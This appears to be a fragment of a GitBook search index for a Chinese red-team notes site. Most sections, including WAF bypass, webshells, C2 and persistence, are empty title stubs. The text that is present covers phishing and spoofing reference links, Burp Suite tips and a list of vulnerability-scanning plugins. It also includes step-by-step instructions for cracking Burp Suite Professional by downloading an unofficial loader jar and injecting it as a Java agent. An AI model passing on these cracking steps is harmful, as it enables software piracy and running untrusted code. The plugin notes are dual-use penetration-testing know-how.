记一次企业安全意识宣传活动-钓鱼邮件：https://www.freebuf.com/column/154460.html 钓鱼邮件攻击防范指南：https://cloud.tencent.com/devel 写的比较好的 https://moshou.org.cn/index.php/archives/5/ 邮件伪造之SPF绕过的5种思路 https://mp.weixin.qq.com/s/dqntjRLgcOD3D2bi1oDFAw Swaks伪造邮件 https://payloads.online/archivers/2019-05-09/1/ Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-01 10:53:25 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/06.WAF绕过/":{"url":"红蓝对抗/01.打点/06.WAF绕过/","title":"06.WAF绕过","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/07.思路技巧/":{"url":"红蓝对抗/01.打点/07.思路技巧/","title":"07.思路技巧","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/08.其他与打点相关/":{"url":"红蓝对抗/01.打点/08.其他与打点相关/","title":"08.其他与打点相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/01.Webshell/":{"url":"红蓝对抗/02.后渗透/01.Webshell/","title":"01.Webshell","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/02.提权/":{"url":"红蓝对抗/02.后渗透/02.提权/","title":"02.提权","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/03.代理/":{"url":"红蓝对抗/02.后渗透/03.代理/","title":"03.代理","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/04.免杀/":{"url":"红蓝对抗/02.后渗透/04.免杀/","title":"04.免杀","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/05.C2.CC/":{"url":"红蓝对抗/02.后渗透/05.C2.CC/","title":"05.C2.CC","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/06.权限维持/":{"url":"红蓝对抗/02.后渗透/06.权限维持/","title":"06.权限维持","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/07.横向/":{"url":"红蓝对抗/02.后渗透/07.横向/","title":"07.横向","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/08.域渗透/":{"url":"红蓝对抗/02.后渗透/08.域渗透/","title":"08.域渗透","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/09.痕迹清理/":{"url":"红蓝对抗/02.后渗透/09.痕迹清理/","title":"09.痕迹清理","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/10.思路技巧总结/":{"url":"红蓝对抗/02.后渗透/10.思路技巧总结/","title":"10.思路技巧总结","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/02.后渗透/11.其他与后渗透相关/":{"url":"红蓝对抗/02.后渗透/11.其他与后渗透相关/","title":"11.其他与后渗透相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/03.威胁情报/":{"url":"红蓝对抗/03.威胁情报/","title":"03.威胁情报","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/04.应急溯源/":{"url":"红蓝对抗/04.应急溯源/","title":"04.应急溯源","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/05.APT分析报告/":{"url":"红蓝对抗/05.APT分析报告/","title":"05.APT分析报告","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/06.车联网安全/":{"url":"红蓝对抗/06.车联网安全/","title":"06.车联网安全","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/07.工控安全/":{"url":"红蓝对抗/07.工控安全/","title":"07.工控安全","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/":{"url":"红蓝对抗/08.基础技能相关/","title":"08.基础技能相关","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/01.Git笔记/":{"url":"红蓝对抗/08.基础技能相关/01.Git笔记/","title":"01.Git笔记","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/02.Vim笔记/":{"url":"红蓝对抗/08.基础技能相关/02.Vim笔记/","title":"02.Vim笔记","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/01.BurpSuit破解.html":{"url":"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/01.BurpSuit破解.html","title":"01.BurpSuit破解","keywords":"","body":"0x01下载官网包 https://portswigger.net/burp/releases/ 0x02下载loader https://raw.githubusercontent.com/x-Ai/BurpSuite/main/BurpSuiteLoader.jar SHA256: 1E54FBBAF3423C8B15B2507CB1E8C18092B0F728AA705EF8D235AC4300CD3E29 MD5: DEFAFC938A0344B188D7273D3DD3EB48 0x03破解流程 放置Loader至如下路径 /Applications/Burp Suite Professional.app/Contents/java/app 修改如下路径文件内容 /Applications/Burp Suite Professional.app/Contents/Info.plist 修改Info.plist文件，-Dexe4j.moduleName=$APP_PACKAGE 后插入如下语句 ...... -Dexe4j.moduleName=$APP_PACKAGE -noverify -javaagent:$APP_PACKAGE/Contents/Resources/app/BurpSuiteLoader.jar 使用启动台中的BurpSuite快捷方式即可享用 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-05 15:09:26 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/02.BurpSuit使用Tips.html":{"url":"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/02.BurpSuit使用Tips.html","title":"02.BurpSuit使用Tips","keywords":"","body":"BurpSuit使用技巧，欢迎享用 0x01 批量打POC 新版Burpsuite 2021.10的Indruder增加了配置Target的功能，也就是说现在发包的目标也可以作为Payload Position了，这直接给Burpsuite扩展出了批量打POC的能力。 比如我们可以收集一批子域名，用这个功能批量探测是否存在备份文件、敏感文件等。 0x02 Indruder限制返回头 另外分享个技巧，在Indruder跑结果的时候如果遇到返回包特别大导致Burpsuite很卡的情况，可以考虑在请求包里使用Range头来限制返回包的大小： Range: bytes=0-1024 原因是通常我们在扫描类似于备份文件这样的敏感文件时，我们只需要判断返回包的头是不是压缩包头即可，所以其实我们只需要拿到返回包的前N个字节即可，这样就可以避免遇到返回包很大占用大量内存的情况，也提高了扫描的速度。 这个技巧也是之前我在写XRay的目录扫描插件时使用的。 0x03 burp启动默认不走socks # Enter one VM parameter per line \\# For example, to adjust the maximum memory usage to 512 MB, uncomment the following line: \\# -Xmx512m \\# To include another file, uncomment the following line: \\# -include-options [path to other .vmoption file] -XX:MaxRAMPercentage=50 --illegal-access=permit -include-options user.vmoptions -Dhttp.proxyHost= -Dhttps.proxyHost= -DsocksProxyHost= -noverify -javaagent:burp-loader-x-Ai.jar 0x04 光标错位和中文显示 0x05 Burp流量处理 01 使用浏览器插件过滤噪声 02 对请求包进行非缓存的响应 可以通过在 Burp 的代理选项中启用强制所有响应非缓存，这样就可以看到操作后最新的版本： 03 请求格式转换 XML和json数据可以一键转换 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-08 10:33:51 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/03.BurpSuit插件.html":{"url":"红蓝对抗/08.基础技能相关/03.BurpSuit笔记/03.BurpSuit插件.html","title":"03.BurpSuit插件","keywords":"","body":"我的BurpSuite食用方法 https://xz.aliyun.com/t/9690#toc-13 武装我的Burpsuite https://zone.huoxian.cn/d/823-burpsuite BurpSuite测试中一些常用tips https://xz.aliyun.com/t/11132 实战指南 https://t0data.gitbooks.io/burpsuite/content/chapter13.html 0x01 Reflector 下载地址:https://github.com/elkokc/reflector 通过设置Content-Type: text/html, 我们可以快速找到请求中的参数哪个被返回到回显的Body中，同时会进行一些特殊字符(etc)的探测, 以用来快速定位可疑的XSS漏洞。 0x02 DOMXSSHilight 下载地址:https://github.com/sechacking/DOMXSSHilight 这个主要是定位一些Dom的sink, 可以辅助手工去dig dom xss。 0x03 U2C v0.8 by bit4 下载地址:https://github.com/bit4woo/u2c 这个小工具还有非常有用的，用于转换返回包的unicode为中文，效果杠杠的。 0x04 Hack Bar 下载地址:https://github.com/d3vilbug/HackBar 集成了多种漏洞类型的一些payload，测试的时候可以非常方便地使用 0x05 BurpShiroPassiveScan https://github.com/pmiaowu/BurpShiroPassiveScan 被动扫描发现shiro，支持自定义key 0x06 FastJsonScan https://github.com/pmiaowu/BurpFastJsonScan 0x07 SSRF-King 下载地址:https://github.com/ethicalhackingplayground/ssrf-king 支持扫描和自动发现SSRF漏洞。 0x08 Autorize 下载地址: Bapp 里面就有 这个主要用于测试权限问题，可以自动发现不用授权的接口。 0x09 FastjsonScan 下载地址:https://github.com/zilong3033/fastjsonScan 这个插件算是比较全的检测fastjson的反序列化漏洞，这个检测机制是POST类型,且 Content-Type: application/json的请求。 0x10 Burp Bounty 下载地址:https://github.com/wagiro/BurpBounty 主要是提供可视化界面来代替花时间去写一些匹配关键字插件的功能，不过它的Pro版本有个功能叫smart scan，支持被动扫描+主动扫描，非pro版本不支持被动的时候直接去发包，但支持检测请求的时候的一些特征，比如我们有时候对一些方法需要重点关注下比如PUT方法的请求，还有就是一些敏感的端点也需要注意下，就可以用Burp Bounty来自定义profile做检测。 其实被动和主动，准确定义来说，被动应该是不会主动发包的，不过现在被动也可以理解成，被动获取到URL，然后对URL进行自动扫描。emmm。 profile参考: https://github.com/six2dez/burp-bounty-profiles 0x11 HaE 下载地址:https://github.com/gh0stkey/HaE 用于高亮特征和定位敏感信息,关于配置文件可以直接使用官方提供的:https://gh0st.cn/HaE/ 0x12 Log4jScan ppwu 支持自定义 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-08 16:04:50 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/01.Powershell/":{"url":"编程开发/01.Powershell/","title":"01.Powershell","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/02.Python/":{"url":"编程开发/02.Python/","title":"02.Python","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/03.Golang/":{"url":"编程开发/03.Golang/","title":"03.Golang","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/04.CandC++/":{"url":"编程开发/04.CandC++/","title":"04.CandC++","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-27 19:06:11 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"编程开发/05.JavaScript/":{"url":"编程开发/05.JavaScript/","title":"05.JavaScript","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-01 15:35:53 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "}}